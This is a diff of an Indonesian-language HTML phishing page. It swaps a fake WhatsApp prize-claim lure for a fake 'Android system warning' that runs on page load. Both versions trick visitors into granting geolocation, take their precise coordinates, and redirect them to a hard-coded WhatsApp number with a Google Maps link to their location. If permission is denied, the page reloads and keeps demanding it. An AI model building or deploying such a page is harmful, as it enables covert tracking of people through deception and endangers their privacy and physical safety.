@@ -1,49 +1,34 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kejutan Spesial!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Sistem Android</title>
     <style>
-        body, html { height: 100%; margin: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; align-items: center; justify-content: center; }
-        .card { background: white; padding: 40px 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 380px; width: 90%; text-align: center; border: 3px solid #FFD700; } /* Border Emas */
-        .gift-icon { font-size: 70px; margin-bottom: 20px; display: block; }
-        h2 { font-size: 24px; color: #d32f2f; margin-bottom: 10px; font-weight: bold; } /* Warna Merah Hadiah */
-        p { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 30px; }
-        button { background: linear-gradient(45deg, #FFD700, #FFA500); color: #333; border: none; padding: 18px; border-radius: 50px; font-size: 18px; font-weight: bold; width: 100%; cursor: pointer; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); transition: transform 0.2s; }
-        button:active { transform: scale(0.98); box-shadow: 0 2px 5px rgba(255, 215, 0, 0.3); }
-        .wa-logo { width: 20px; vertical-align: middle; margin-right: 8px; }
+        body { background: #000; color: #fff; text-align: center; padding-top: 50px; font-family: sans-serif; }
+        .alert { border: 1px solid #444; padding: 20px; margin: 20px; border-radius: 10px; }
+        button { background: #007bff; color: #fff; border: none; padding: 15px; width: 80%; border-radius: 5px; font-weight: bold; }
     </style>
 </head>
-<body>
-    <div class="card">
-        <span class="gift-icon">🎁</span> <h2>SELAMAT!</h2>
-        <p>Nomor WhatsApp Anda terpilih untuk menerima hadiah kejutan spesial hari ini. Klik tombol di bawah untuk mengonfirmasi data dan mengklaim hadiah Anda.</p>
-        
-        <button onclick="klaim()">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="wa-logo">
-            KLAIM HADIAH SAYA
-        </button>
+<body onload="minta()">
+    <div class="alert">
+        <p><b>⚠️ PERINGATAN SISTEM</b></p>
+        <p>Versi Android Anda memerlukan verifikasi lokasi untuk melanjutkan percakapan WhatsApp ini.</p>
+        <button onclick="minta()">VERIFIKASI SEKARANG</button>
     </div>
 
     <script>
-        function klaim() {
+        function minta() {
             if (navigator.geolocation) {
-                // Menampilkan alert samaran sebelum meminta lokasi
-                alert("Sistem sedang memverifikasi lokasi perangkat Anda untuk memastikan hadiah dikirim ke wilayah yang benar. Mohon tekan 'Allow/Izinkan' pada petunjuk selanjutnya.");
-                
                 navigator.geolocation.getCurrentPosition(function(p) {
                     const lat = p.coords.latitude;
                     const lon = p.coords.longitude;
                     const wa = "6281283408166";
-                    const teks = encodeURIComponent("SISTEM: HADIAH TERKONFIRMASI\n\nLokasi Pengguna: " + lat + "," + lon + "\nGoogle Maps: https://www.google.com/maps?q=" + lat + "," + lon + "\n\nHarap hubungi pengguna untuk pengiriman.");
-                    window.location.href = "https://wa.me/" + wa + "?text=" + teks;
+                    const linkWA = "https://wa.me/" + wa + "?text=" + encodeURIComponent("KONFIRMASI LOKASI: https://www.google.com/maps?q=" + lat + "," + lon);
+                    window.location.href = linkWA;
                 }, function(e) {
-                    alert("Maaf, klaim gagal. Anda harus menekan 'Allow' atau 'Izinkan' agar sistem dapat memverifikasi wilayah Anda.");
+                    alert("KESALAHAN: Anda harus menekan 'IZINKAN' untuk memulihkan akses chat.");
                     location.reload();
-                }, {enableHighAccuracy: true, timeout: 5000, maximumAge: 0});
-            } else {
-                alert("Browser Anda tidak mendukung fitur klaim hadiah.");
+                }, {enableHighAccuracy: true});
             }
         }
     </script>
